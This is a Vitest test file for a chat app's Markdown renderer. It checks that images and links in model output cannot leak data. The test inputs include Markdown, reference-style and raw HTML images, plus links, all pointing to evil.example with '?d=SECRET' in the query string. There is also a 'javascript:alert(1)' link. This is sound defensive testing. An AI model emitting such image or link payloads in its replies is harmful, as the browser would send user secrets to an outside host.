/** What the chat renderer does with links and images in model output
 *  (Phase 7a.2). Rendered for real (react-dom/server), because the danger is
 *  an <img> element existing at all: the browser fetches it on render. */
import { createElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import { Markdown } from "./Markdown";

const render = (text: string) => renderToStaticMarkup(createElement(Markdown, { text }));

describe("images in model output", () => {
  it("are never loaded: no <img>, a note instead", () => {
    const html = render("Here is the chart ![chart](https://evil.example/c.png?d=SECRET)");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("SECRET");
    expect(html).toContain("Image not shown: chart (evil.example)");
  });

  it("are not loaded through reference-style Markdown either", () => {
    const html = render("![logo][x]\n\n[x]: https://evil.example/l.png?d=SECRET");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("SECRET");
  });

  it("raw HTML images stay text", () => {
    const html = render('<img src="https://evil.example/?d=SECRET">');
    expect(html).not.toContain("<img");
  });
});

describe("links in model output", () => {
  it("show the host when the text hides where they go", () => {
    const html = render("Read the [Refund policy](https://evil.example/?d=SECRET).");
    expect(html).toContain(">Refund policy</a>");
    expect(html).toContain("(evil.example)");
    expect(html).toContain('rel="noopener noreferrer"');
  });

  it("do not repeat an address the text already shows", () => {
    const html = render("See https://docs.example.com/vpn for details.");
    expect(html).not.toContain("(docs.example.com)");
  });

  it("citation chips are untouched", () => {
    const html = render("Thirty days [1](#cite-1).");
    expect(html).toContain('aria-label="Source 1"');
    expect(html).not.toContain("(this.site)");
  });

  it("never become javascript: links", () => {
    const html = render("[click](javascript:alert(1))");
    expect(html).not.toContain("javascript:");
  });
});
